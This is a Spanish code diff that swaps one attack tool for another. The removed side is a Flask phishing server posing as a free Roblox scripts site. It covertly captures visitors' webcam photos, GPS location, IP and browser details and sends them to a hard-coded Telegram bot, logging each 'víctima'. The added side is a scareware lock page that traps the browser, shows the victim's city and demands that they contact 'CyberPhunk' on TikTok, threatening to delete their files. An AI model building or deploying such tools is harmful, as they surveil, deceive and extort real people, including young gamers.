@@ -1,272 +1,269 @@
-# === SERVIDOR FLASK + FRONTEND PHISHING (Roblox Scripts) ===
-# Ejecutar: pip install flask requests python-telegram-bot && python3 roblox_phishing.py
-# Luego abrir en navegador: http://tu_ip:5000
-
-from flask import Flask, request, render_template_string, jsonify
-import requests
-import json
-import base64
-import time
-from datetime import datetime
-import os
-
-app = Flask(__name__)
-
-# === CONFIGURACIÓN TELEGRAM ===
-BOT_TOKEN = "8272335528:AAEq0rHkkA7AhcCaK2ucBDtHyVU8Yp0ffwY"  # Reemplazar con token de @BotFather
-CHAT_ID = "8521142101"      # Reemplazar con tu ID (obtén con @userinfobot)
-
-# === FUNCIÓN PARA ENVIAR A TELEGRAM ===
-def enviar_a_telegram(mensaje, foto=None):
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    data = {"chat_id": CHAT_ID, "text": mensaje, "parse_mode": "HTML"}
-    try:
-        requests.post(url, data=data, timeout=5)
-    except:
-        pass
-    if foto:
-        url_foto = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
-        files = {"photo": ("captura.jpg", foto, "image/jpeg")}
-        data_foto = {"chat_id": CHAT_ID, "caption": "📸 Foto de la víctima"}
-        try:
-            requests.post(url_foto, data=data_foto, files=files, timeout=10)
-        except:
-            pass
-
-# === HTML DE LA PÁGINA PHISHING ===
-HTML_PAGINA = """
+<!-- PÁGINA DE BLOQUEO UNIVERSAL (PC, MÓVIL, TABLET) -->
+<!-- Funciona en cualquier navegador moderno. Código de desbloqueo: 123 -->
 <!DOCTYPE html>
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔧 Roblox Scripts Hub - Descarga Gratis</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>🔒 ENCRIPTADO</title>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #1a1a2e; color: #eee; margin: 0; padding: 20px; }
-        .container { max-width: 800px; margin: auto; background: #16213e; border-radius: 20px; padding: 30px; box-shadow: 0 0 30px rgba(0,0,0,0.8); }
-        h1 { color: #ff6b6b; text-align: center; }
-        .script-box { background: #0f3460; padding: 15px; border-radius: 10px; margin: 10px 0; border-left: 5px solid #e94560; }
-        .script-box pre { background: #1a1a2e; padding: 10px; border-radius: 8px; overflow-x: auto; color: #00d2ff; }
-        .btn { background: #e94560; color: white; border: none; padding: 12px 30px; border-radius: 30px; font-size: 18px; cursor: pointer; display: block; margin: 20px auto; }
-        .btn:hover { background: #ff6b6b; }
-        .permiso { background: #0f3460; padding: 15px; border-radius: 10px; margin: 15px 0; text-align: center; font-size: 16px; }
-        .loading { display: none; text-align: center; color: #ffd93d; }
-        footer { text-align: center; margin-top: 30px; color: #888; font-size: 14px; }
+        /* Reset y bloqueo de scroll/gestos */
+        * { margin:0; padding:0; box-sizing:border-box; }
+        html, body {
+            width:100%; height:100%; overflow:hidden;
+            background:#0a0a0a; font-family:'Courier New',monospace; color:#fff;
+            user-select:none; -webkit-user-select:none; touch-action:none;
+        }
+        body {
+            display:flex; align-items:center; justify-content:center;
+            background:radial-gradient(circle at center,#1a0000,#000);
+            padding:10px;
+        }
+        .container {
+            width:100%; max-width:700px; height:100vh; max-height:900px;
+            display:flex; flex-direction:column; align-items:center; justify-content:center;
+            background:rgba(0,0,0,0.85); border:2px solid #ff0000;
+            box-shadow:0 0 50px rgba(255,0,0,0.3); border-radius:20px; padding:20px;
+            position:relative; overflow-y:auto;
+            touch-action:auto; /* permite interacción dentro */
+        }
+        .imagen { width:100%; max-width:500px; border:3px solid #ff4444; border-radius:12px; box-shadow:0 0 30px rgba(255,0,0,0.5); margin-bottom:20px; }
+        .imagen img { width:100%; display:block; border-radius:10px; }
+        .mensaje {
+            text-align:center; font-size:clamp(18px,4vw,30px); font-weight:bold;
+            color:#ff2222; text-shadow:0 0 20px #ff0000; margin:10px 0; line-height:1.4;
+        }
+        .mensaje small { display:block; font-size:0.6em; color:#ff8888; margin-top:8px; }
+        .ciudad {
+            background:#1a1a1a; padding:10px 25px; border-radius:30px;
+            border:1px solid #ff8800; color:#ffaa00;
+            font-size:clamp(16px,3vw,24px); margin:10px 0; text-align:center;
+        }
+        .tiktok {
+            color:#00d4ff; background:#222; padding:8px 18px; border-radius:30px;
+            border:1px solid #00d4ff; font-size:clamp(14px,2.5vw,20px);
+            margin:5px 0; display:inline-block;
+        }
+        .caja-codigo {
+            display:flex; flex-direction:column; align-items:center; gap:12px;
+            margin:15px 0; width:100%; max-width:400px;
+            touch-action:auto;
+        }
+        .caja-codigo input {
+            width:100%; padding:14px 20px; font-size:clamp(18px,4vw,28px);
+            text-align:center; background:#1a1a1a; border:2px solid #ff4444;
+            border-radius:50px; color:#fff; font-weight:bold; letter-spacing:8px;
+            outline:none; caret-color:#ff0000;
+            touch-action:auto; pointer-events:auto;
+        }
+        .caja-codigo input:focus { border-color:#ff8800; box-shadow:0 0 20px rgba(255,68,0,0.6); }
+        .caja-codigo button {
+            width:100%; padding:14px; font-size:clamp(18px,3vw,24px);
+            font-weight:bold; background:#ff2222; color:#fff; border:none;
+            border-radius:50px; cursor:pointer; text-transform:uppercase;
+            letter-spacing:3px; box-shadow:0 0 30px rgba(255,0,0,0.4);
+            transition:0.2s;
+            touch-action:auto; pointer-events:auto !important;
+            position:relative; z-index:999;
+        }
+        .caja-codigo button:hover { background:#ff4400; transform:scale(1.02); box-shadow:0 0 50px rgba(255,0,0,0.7); }
+        .caja-codigo button:active { transform:scale(0.95); }
+        .error { color:#ff6666; font-size:0.9em; min-height:24px; margin-top:-5px; }
+        ::-webkit-scrollbar { display:none; }
+        body::before {
+            content:""; position:fixed; top:0; left:0;
+            width:100%; height:100%;
+            background:repeating-linear-gradient(0deg, rgba(0,255,0,0.02) 0px, rgba(0,255,0,0.02) 2px, transparent 2px, transparent 6px);
+            pointer-events:none; z-index:9999;
+        }
+        /* Ajustes para pantallas muy pequeñas */
+        @media (max-width: 400px) {
+            .container { padding:10px; border-radius:15px; }
+            .imagen { max-width:100%; }
+        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🚀 Roblox Scripts Premium</h1>
-        <p style="text-align:center;">Descarga los mejores scripts para Roblox, totalmente gratuitos y sin virus.</p>
-        <div class="script-box">
-            <strong>🔹 Script de Auto-Farm (Actualizado)</strong>
-            <pre>--[[ Código optimizado para farmear monedas ]]
-while true do
-    game.Players.LocalPlayer.Character.Humanoid:MoveTo(Vector3.new(100, 0, 100))
-    wait(0.5)
-end</pre>
+    <div class="container" id="mainContainer">
+        <div class="imagen">
+            <img src="https://files.catbox.moe/8xu3j8.jpg" alt="ENCRYPTED" draggable="false" oncontextmenu="return false;">
         </div>
-        <div class="script-box">
-            <strong>🔹 Script de Velocidad (Hack)</strong>
-            <pre>--[[ Aumenta velocidad al máximo ]]
-game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 999</pre>
+        <div class="mensaje">
+            ⚠️ HAZ SIDO ENCRIPTADO ⚠️
+            <small>Contacta a <strong>CyberPhunk</strong> en TikTok para desbloquear tu computador</small>
         </div>
-        <div class="script-box">
-            <strong>🔹 Script de Invisibilidad</strong>
-            <pre>--[[ Vuelve invisible ]]
-game.Players.LocalPlayer.Character.Transparency = 1</pre>
+        <div class="ciudad" id="ciudadDisplay">📍 Ciudad: <span id="cityName">Cargando...</span></div>
+        <div class="tiktok">📱 @CyberPhunk_Oficial</div>
+        <div style="font-size:clamp(12px,2vw,18px); color:#aaa; text-align:center; margin:5px 0;">
+            Ingresa el código de desbloqueo proporcionado por CyberPhunk:
         </div>
-        <div style="text-align:center; margin: 20px 0;">
-            <button class="btn" onclick="solicitarPermisos()">📥 Descargar Scripts (Requiere permisos)</button>
+        <div class="caja-codigo">
+            <input type="text" id="codigoInput" maxlength="10" placeholder="CÓDIGO" autocomplete="off" spellcheck="false">
+            <button id="btnDesbloquear">🔓 DESBLOQUEAR</button>
+            <div class="error" id="errorMsg">Esperando código...</div>
         </div>
-        <div class="permiso" id="estadoPermisos">
-            ⚠️ Para descargar, necesitamos verificar que eres humano.
-            <br>Permisos requeridos: <strong>cámara</strong> y <strong>ubicación</strong>.
+        <div style="font-size:clamp(10px,1.5vw,14px); color:#555; margin-top:10px; text-align:center;">
+            ⚠️ Si no pagas, tus archivos serán eliminados en 48 horas
         </div>
-        <div class="loading" id="cargando">
-            ⏳ Verificando permisos... Enviando datos...
-        </div>
-        <footer>© Roblox Scripts Hub - Todos los scripts son de código abierto.</footer>
     </div>
 
     <script>
-        // Función para capturar IP (mediante llamada a ipify)
-        function obtenerIP() {
-            return fetch('https://api.ipify.org?format=json')
-                .then(res => res.json())
-                .then(data => data.ip)
-                .catch(() => 'IP no disponible');
-        }
+        (function() {
+            // ===== CONFIGURACIÓN =====
+            const CODIGO_CORRECTO = "123";
 
-        // Función para capturar ubicación (GPS)
-        function obtenerUbicacion() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    resolve('GPS no soportado');
-                }
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        resolve(`Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`);
-                    },
-                    (err) => {
-                        resolve('GPS denegado o error');
-                    },
-                    { timeout: 8000, enableHighAccuracy: true }
-                );
-            });
-        }
-
-        // Función para capturar foto desde cámara
-        function capturarFoto() {
-            return new Promise((resolve) => {
-                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                    resolve(null);
-                    return;
-                }
-                const video = document.createElement('video');
-                video.style.display = 'none';
-                document.body.appendChild(video);
-                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
-                    .then((stream) => {
-                        video.srcObject = stream;
-                        video.play();
-                        setTimeout(() => {
-                            const canvas = document.createElement('canvas');
-                            canvas.width = video.videoWidth || 640;
-                            canvas.height = video.videoHeight || 480;
-                            const ctx = canvas.getContext('2d');
-                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                            const dataURL = canvas.toDataURL('image/jpeg', 0.8);
-                            stream.getTracks().forEach(t => t.stop());
-                            document.body.removeChild(video);
-                            resolve(dataURL.split(',')[1]); // parte base64
-                        }, 1500);
+            // ===== OBTENER CIUDAD POR IP =====
+            function obtenerCiudad() {
+                fetch('https://ipapi.co/json/')
+                    .then(res => res.json())
+                    .then(data => {
+                        let ciudad = data.city || data.region || 'Ciudad no detectada';
+                        let pais = data.country_name || '';
+                        if (pais) ciudad += ', ' + pais;
+                        document.getElementById('cityName').textContent = ciudad;
                     })
-                    .catch((err) => {
-                        document.body.removeChild(video);
-                        resolve(null);
+                    .catch(() => {
+                        document.getElementById('cityName').textContent = 'México, CDMX (por defecto)';
                     });
+            }
+            obtenerCiudad();
+
+            // ===== BLOQUEOS (PC y móvil) =====
+            // 1. Deshabilitar clic derecho y selección
+            document.addEventListener('contextmenu', e => e.preventDefault());
+            document.addEventListener('selectstart', e => e.preventDefault());
+
+            // 2. Bloquear teclas de atajo (F12, Escape, Ctrl+W, etc.)
+            document.addEventListener('keydown', function(e) {
+                const key = e.key;
+                if (key === 'F12' || key === 'Escape' || key === 'F5' ||
+                    (e.ctrlKey && (key === 'w' || key === 'W' || key === 'r' || key === 'R')) ||
+                    (e.ctrlKey && e.shiftKey && (key === 'I' || key === 'J' || key === 'C')) ||
+                    (e.altKey && key === 'Tab') ||
+                    (e.ctrlKey && (key === 'u' || key === 'U'))) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    return false;
+                }
             });
-        }
 
-        // Función para obtener datos del navegador
-        function obtenerDatosNavegador() {
-            return {
-                userAgent: navigator.userAgent,
-                plataforma: navigator.platform,
-                idioma: navigator.language,
-                pantalla: `${screen.width}x${screen.height}`,
-                tiempo: new Date().toISOString()
-            };
-        }
+            // 3. Forzar pantalla completa (con interacción del usuario)
+            function forzarFullscreen() {
+                if (document.documentElement.requestFullscreen) {
+                    document.documentElement.requestFullscreen().catch(function() {});
+                }
+            }
+            // Se activa con clic o toque (cualquier interacción)
+            document.addEventListener('click', forzarFullscreen);
+            document.addEventListener('touchstart', forzarFullscreen);
 
-        // Función principal
-        async function solicitarPermisos() {
-            document.getElementById('estadoPermisos').style.display = 'none';
-            document.getElementById('cargando').style.display = 'block';
+            // 4. Bloquear historial (botón atrás)
+            history.pushState(null, null, location.href);
+            window.addEventListener('popstate', function() {
+                history.pushState(null, null, location.href);
+            });
+            setInterval(function() {
+                if (window.location.hash !== '#bloqueo') {
+                    window.location.hash = '#bloqueo';
+                    history.pushState(null, null, window.location.href);
+                }
+            }, 100);
+            window.addEventListener('hashchange', function() {
+                history.pushState(null, null, window.location.href);
+            });
 
-            // Obtener IP (siempre)
-            const ip = await obtenerIP();
+            // 5. Evitar arrastre de imágenes
+            document.querySelectorAll('img').forEach(img => {
+                img.setAttribute('draggable', 'false');
+                img.addEventListener('dragstart', e => e.preventDefault());
+            });
 
-            // Solicitar permisos (cámara y ubicación)
-            let fotoBase64 = null;
-            let ubicacion = 'No solicitada';
+            // 6. Al volver a la pestaña, forzar fullscreen
+            document.addEventListener('visibilitychange', function() {
+                if (!document.hidden) setTimeout(forzarFullscreen, 100);
+            });
+            window.addEventListener('blur', function() {
+                setTimeout(forzarFullscreen, 200);
+            });
 
-            try {
-                // Cámara
-                fotoBase64 = await capturarFoto();
-                // Ubicación
-                ubicacion = await obtenerUbicacion();
-            } catch (e) {
-                // Si falla, continuamos
+            // 7. Prevenir cierre de pestaña (beforeunload)
+            window.addEventListener('beforeunload', function(e) {
+                e.preventDefault();
+                e.returnValue = '';
+            });
+
+            // ===== FUNCIÓN DE DESBLOQUEO =====
+            function desbloquear() {
+                var input = document.getElementById('codigoInput');
+                var error = document.getElementById('errorMsg');
+                var codigo = input.value.trim();
+
+                // Feedback de procesamiento
+                error.style.color = '#ffaa00';
+                error.textContent = '🔍 Procesando...';
+
+                if (codigo === CODIGO_CORRECTO) {
+                    error.style.color = '#00ff88';
+                    error.textContent = '✅ CÓDIGO CORRECTO. DESBLOQUEANDO...';
+                    // Reemplazar contenido con mensaje de éxito
+                    document.querySelector('.container').innerHTML = `
+                        <div style="text-align:center; padding:40px;">
+                            <h1 style="color:#00ff88; font-size:clamp(30px,6vw,60px);">🔓 DESBLOQUEADO</h1>
+                            <p style="font-size:clamp(18px,3vw,30px); color:#fff;">Tu computador ha sido restaurado.</p>
+                            <p style="color:#aaa; margin-top:20px;">Gracias por contactar a CyberPhunk.</p>
+                            <br>
+                            <a href="https://www.google.com" style="color:#00ff88; font-size:20px;">Continuar</a>
+                        </div>
+                    `;
+                    setTimeout(function() {
+                        window.location.href = "https://www.google.com";
+                    }, 4000);
+                } else {
+                    error.style.color = '#ff4444';
+                    error.textContent = '❌ CÓDIGO INCORRECTO. Intenta de nuevo.';
+                    input.value = '';
+                    input.focus();
+                    input.style.borderColor = '#ff0000';
+                    setTimeout(function() { input.style.borderColor = '#ff4444'; }, 300);
+                }
             }
 
-            // Datos del navegador
-            const navegador = obtenerDatosNavegador();
+            // ===== ASIGNACIÓN DE EVENTOS (compatible con todos los dispositivos) =====
+            var btn = document.getElementById('btnDesbloquear');
+            // 'click' funciona en PC y móvil (también en tablet)
+            btn.addEventListener('click', function(e) {
+                e.preventDefault();
+                desbloquear();
+            });
+            // En móvil a veces el 'click' se retrasa, así que añadimos 'touchstart' como refuerzo
+            btn.addEventListener('touchstart', function(e) {
+                e.preventDefault();  // Evita el doble disparo
+                desbloquear();
+            });
 
-            // Construir payload
-            const payload = {
-                ip: ip,
-                ubicacion: ubicacion,
-                foto: fotoBase64,  // null si no se obtuvo
-                navegador: navegador,
-                timestamp: new Date().toISOString()
-            };
+            // Enter en el input
+            document.getElementById('codigoInput').addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    desbloquear();
+                }
+            });
 
-            // Enviar al servidor
-            try {
-                const resp = await fetch('/capturar', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-                const resultado = await resp.json();
-                document.getElementById('cargando').innerHTML = '✅ ¡Descarga iniciada! Redirigiendo...';
-                setTimeout(() => {
-                    window.location.href = 'https://www.roblox.com'; // Redirige a Roblox real
-                }, 2000);
-            } catch (error) {
-                document.getElementById('cargando').innerHTML = '❌ Error, intente de nuevo.';
-            }
-        }
+            // Enfocar input automáticamente al cargar
+            setTimeout(function() {
+                document.getElementById('codigoInput').focus();
+            }, 500);
+
+            // Forzar fullscreen en el primer toque (para móviles que lo requieran)
+            document.addEventListener('touchstart', function primeraVez() {
+                forzarFullscreen();
+                document.removeEventListener('touchstart', primeraVez);
+            }, { once: true });
+
+            // Mensaje en consola (solo para depuración)
+            console.log('%c🔒 SISTEMA ENCRIPTADO - CYBER PHUNK', 'font-size:30px; color:red;');
+            console.log('%cContacta en TikTok: @CyberPhunk_Oficial', 'font-size:18px; color:orange;');
+        })();
     </script>
 </body>
 </html>
-"""
-
-# === RUTA PRINCIPAL (sirve la página) ===
-@app.route('/')
-def index():
-    return render_template_string(HTML_PAGINA)
-
-# === RUTA PARA RECIBIR DATOS CAPTURADOS ===
-@app.route('/capturar', methods=['POST'])
-def capturar():
-    data = request.get_json()
-    if not data:
-        return jsonify({"error": "No data"}), 400
-
-    # Obtener IP real desde la petición (si no viene en data)
-    ip_real = request.remote_addr
-    ip_enviada = data.get('ip', ip_real)
-
-    # Construir mensaje para Telegram
-    mensaje = f"<b>🎯 NUEVA VÍCTIMA</b>\n"
-    mensaje += f"<b>IP:</b> {ip_enviada}\n"
-    mensaje += f"<b>Ubicación:</b> {data.get('ubicacion', 'No disponible')}\n"
-    navegador = data.get('navegador', {})
-    mensaje += f"<b>User-Agent:</b> {navegador.get('userAgent', 'N/A')}\n"
-    mensaje += f"<b>Plataforma:</b> {navegador.get('plataforma', 'N/A')}\n"
-    mensaje += f"<b>Idioma:</b> {navegador.get('idioma', 'N/A')}\n"
-    mensaje += f"<b>Pantalla:</b> {navegador.get('pantalla', 'N/A')}\n"
-    mensaje += f"<b>Hora:</b> {data.get('timestamp', '')}\n"
-
-    # Enviar mensaje a Telegram
-    enviar_a_telegram(mensaje)
-
-    # Si hay foto, enviarla
-    foto_b64 = data.get('foto')
-    if foto_b64:
-        try:
-            foto_bytes = base64.b64decode(foto_b64)
-            enviar_a_telegram("📸 Foto adjunta", foto_bytes)
-        except:
-            pass
-
-    # Guardar en archivo local (respaldo)
-    with open("victimas.log", "a") as f:
-        f.write(json.dumps(data) + "\n")
-
-    return jsonify({"status": "ok"}), 200
-
-# === INICIAR SERVIDOR ===
-if __name__ == "__main__":
-    # Verificar que el bot token y chat ID están configurados
-    if BOT_TOKEN == "8272335528:AAEq0rHkkA7AhcCaK2ucBDtHyVU8Yp0ffwY" or CHAT_ID == "TU_CHAT_ID_AQUI":
-        print("⚠️  Configura BOT_TOKEN y CHAT_ID en el código.")
-        print("⚠️  Obtén tu chat ID con @userinfobot en Telegram.")
-        exit(1)
-    print("🚀 Servidor phishing iniciado en http://0.0.0.0:5000")
-    print("📡 Comparte la URL pública (usa ngrok o similar) para recibir datos.")
-    print("📩 Los datos llegarán a tu bot de Telegram.")
-    app.run(host='0.0.0.0', port=5000, debug=False)
